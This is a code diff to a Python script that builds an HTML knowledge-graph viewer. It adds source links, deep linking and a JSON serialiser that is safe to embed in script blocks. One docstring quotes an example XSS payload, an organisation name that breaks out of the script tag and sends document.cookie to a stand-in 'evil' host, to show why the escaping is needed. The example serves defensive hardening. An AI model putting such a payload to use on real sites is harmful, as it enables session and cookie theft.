@@ -58,6 +58,9 @@ import sys
 from collections import Counter, defaultdict
 from datetime import datetime, timezone
 
+from graph_build import read_meta
+from sourcelinks import safe_url, work_url
+
 BG, CARD, BORDER = "#050810", "#0d1117", "#1f2937"
 TEXT, DIM = "#e5e7eb", "#6b7280"
 AMBER = "#f59e0b"
@@ -94,7 +97,7 @@ def load(db: str, max_orgs: int, max_works: int, max_people: int):
     total_rels = cur.execute("SELECT COUNT(*) FROM relations").fetchone()[0]
 
     ents = {r["id"]: dict(r) for r in cur.execute(
-        "SELECT id,name,type,subtype,description,source_doc,weight FROM entities")}
+        "SELECT id,name,type,subtype,description,source_doc,weight,meta FROM entities")}
     rels = [dict(r) for r in cur.execute(
         "SELECT source_id,target_id,predicate,source_doc,weight FROM relations")]
 
@@ -143,9 +146,15 @@ def load(db: str, max_orgs: int, max_works: int, max_people: int):
         e = ents[eid]
         i = len(nodes)
         idx[eid] = i
+        meta = read_meta(e["meta"] if "meta" in e.keys() else None)
         n = {"i": i, "n": e["name"][:90], "t": e["type"], "s": e["subtype"] or "",
              "d": (e["description"] or "")[:240], "p": e["source_doc"] or "",
-             "w": float(e["weight"] or 1)}
+             "w": float(e["weight"] or 1), "id": e["id"]}
+        # A WORK node's URL is authoritative in meta; if an older graph predates
+        # typed meta, fall back to reconstructing it from the id.
+        u = safe_url(meta.get("url")) or work_url(e["subtype"], e["name"])
+        if u:
+            n["u"] = u
         if extra:
             n.update(extra)
         nodes.append(n)
@@ -206,10 +215,36 @@ def load(db: str, max_orgs: int, max_works: int, max_people: int):
     return nodes, agg, detail, merged, stats
 
 
+def _script_safe_json(obj) -> str:
+    r"""
+    Serialise a payload for embedding inside an inline <script> block.
+
+    json.dumps does NOT escape < or >, and the payload here is built from
+    ingested data: entity names come from patent assignees and signal
+    organisations, both of which are attacker-influenceable. An organisation
+    named
+
+        Acme </script><script>fetch('//evil/?c='+document.cookie)</script>
+
+    would close the script element and execute, because the HTML parser looks
+    for the literal string "</script>" without caring that it sits inside a
+    JavaScript string literal.
+
+    Escaping < > & as \u00XX keeps the JSON semantically identical — the
+    JavaScript parser reads the escapes back to the same characters — while
+    making the byte sequence "</script>" impossible to produce.
+    """
+    return (json.dumps(obj, separators=(",", ":"))
+            .replace("<", "\\u003c")
+            .replace(">", "\\u003e")
+            .replace("&", "\\u0026")
+            .replace("\u2028", "\\u2028")
+            .replace("\u2029", "\\u2029"))
+
+
 def render(nodes, agg, detail, merged, stats, out, title):
-    payload = json.dumps({"nodes": nodes, "agg": agg, "detail": detail,
-                          "merged": merged, "style": TYPE_STYLE},
-                         separators=(",", ":"))
+    payload = _script_safe_json({"nodes": nodes, "agg": agg, "detail": detail,
+                                 "merged": merged, "style": TYPE_STYLE})
     built = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
     legend = "".join(
         f'<span class="lg"><svg width="16" height="16" viewBox="0 0 16 16">'
@@ -221,6 +256,7 @@ def render(nodes, agg, detail, merged, stats, out, title):
     html = f"""<!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex, nofollow, noarchive, noimageindex">
 <title>{title}</title>
 <style>
 *{{box-sizing:border-box}}
@@ -271,6 +307,15 @@ td{{padding:3px 4px;border-bottom:1px solid #161d29;vertical-align:top}}
   border-radius:4px;padding:6px 9px;font-size:11.5px;max-width:280px;display:none;z-index:20}}
 details summary{{cursor:pointer;color:{DIM};font-size:11px;margin-top:10px}}
 .note{{color:{DIM};font-size:11px}}
+/* Source links. Underlined on hover only, so a dense Documents list does not
+   turn into a wall of blue — but always carries the ↗ glyph, so a link is
+   distinguishable from plain text without relying on colour alone. */
+a.src{{color:{AMBER};text-decoration:none;border-bottom:1px dotted transparent}}
+a.src:hover{{border-bottom-color:{AMBER}}}
+a.src::after{{content:' ↗';font-size:9px;opacity:.75}}
+.rel a.tgl{{flex:1;color:inherit;text-decoration:none}}
+.rel a.tgl:hover{{color:{AMBER};text-decoration:underline}}
+.dl{{color:{DIM};font-size:10.5px;margin-left:6px}}
 </style></head><body>
 <header>
   <h1>NIA · Neurotech Knowledge Graph</h1>
@@ -609,7 +654,9 @@ function showDetail(i){{
     S[n.t].label+(n.s?' · '+esc(n.s):'')+(n.t==='TECH'&&n.region?' · acts at '+esc(n.region):'')+
     '</div>';
   if(n.d) h+='<div style="margin-bottom:8px">'+esc(n.d)+'</div>';
-  if(n.p) h+='<div class="prov">source: '+esc(n.p)+'</div>';
+  if(n.p) h+='<div class="prov">source: '+esc(n.p)+
+    (n.u?' &middot; <a class="src" href="'+esc(n.u)+'" target="_blank" rel="noopener noreferrer">open</a>':'')+
+    '</div>';
   if(MERGED[i]) h+='<div><b style="color:{AMBER};font-size:11px">MERGED FROM '+
     MERGED[i].length+' SPELLINGS</b><br>'+MERGED[i].map(a=>'<span class="pill">'+esc(a)+'</span>').join('')+'</div>';
 
@@ -627,10 +674,15 @@ function showDetail(i){{
   if(de.length){{
     h+='<h2>Documents</h2>';
     for(const e of de){{
-      const o=(e.a===i)?e.b:e.a;
+      const o=(e.a===i)?e.b:e.a, on=N[o];
+      // Two distinct targets per row, and they must not be confusable: the
+      // NAME re-focuses the graph on that node, the ↗ leaves for the source
+      // document. Making the whole row do one or the other would cost the
+      // other, and this panel exists to do both.
       h+='<div class="rel"><span class="pd">'+esc(e.p)+'</span><span class="tg" data-i="'+o+
-         '" style="color:'+S[N[o].t].color+'">'+esc(N[o].n)+'</span></div>'+
-         (e.d?'<div class="prov">'+esc(e.d)+'</div>':'');
+         '" style="color:'+S[on.t].color+'">'+esc(on.n)+'</span>'+
+         (on.u?'<a class="src" href="'+esc(on.u)+'" target="_blank" rel="noopener noreferrer" title="open source document"></a>':'')+
+         '</div>'+(e.d?'<div class="prov">'+esc(e.d)+'</div>':'');
     }}
   }}
   d.innerHTML=h;
@@ -644,6 +696,53 @@ document.getElementById('tbl').innerHTML=
      aggAdj[n.i].reduce((s,e)=>s+AGG[e].w,0)+'</td></tr>').join('');
 
 layoutBrain(); fit(); showDetail(null); draw();
+
+/* ── deep linking ──────────────────────────────────────────────────────────
+   graph.html?focus=<uuid>&name=<display name>
+
+   The dashboard links here from every entity in the scored leaderboard. Two
+   keys are accepted because they fail differently: `focus` is the uuid5
+   entity id, exact but only valid while the graph is built from the same
+   corpus, and `name` is the display name, fuzzy but stable across rebuilds.
+   Trying the id first and the name second means a link pasted into Slack in
+   August still lands on the right node in October, when the ids have all
+   been regenerated.
+
+   A node that resolves but is not currently drawn (a WORK, hidden until
+   "show works" is on) turns that layer on rather than silently doing
+   nothing — otherwise the link looks broken to the person who clicked it. */
+(function deepLink(){{
+  var q;
+  try{{ q=new URLSearchParams(location.search); }}catch(e){{ return; }}
+  var fid=q.get('focus'), nm=(q.get('name')||'').trim().toLowerCase();
+  if(!fid && !nm) return;
+
+  var hit=-1;
+  if(fid) for(var i=0;i<N.length;i++) if(N[i].id===fid){{ hit=i; break; }}
+  if(hit<0 && nm){{
+    for(var j=0;j<N.length;j++) if((N[j].n||'').toLowerCase()===nm){{ hit=j; break; }}
+    if(hit<0) for(var k=0;k<N.length;k++)
+      if((N[k].n||'').toLowerCase().indexOf(nm)>=0){{ hit=k; break; }}
+  }}
+  if(hit<0){{
+    /* Say so. An unfocused graph with no explanation reads as a broken link. */
+    var d=document.getElementById('detail');
+    d.innerHTML='<h2>Not in this view</h2><p class="note">The link pointed at '+
+      '<b>'+esc(q.get('name')||q.get('focus')||'')+'</b>, which is not in the '+
+      'currently rendered slice of the graph &mdash; the view is capped at the '+
+      'highest-connectivity nodes, and it may also have dropped out of the '+
+      'corpus since the link was made.<br><br>Try the search box above.</p>';
+    return;
+  }}
+  if(N[hit].t==='WORK' && !showWorks){{
+    showWorks=true;
+    var b=document.getElementById('works');
+    /* Label too, not just the class — a button reading "show works" while the
+       works are already shown is worse than no button state at all. */
+    if(b){{ b.classList.add('on'); b.textContent='hide works'; }}
+  }}
+  sel=hit; showDetail(sel); draw();
+}})();
 </script></body></html>"""
     with open(out, "w", encoding="utf-8") as f:
         f.write(html)
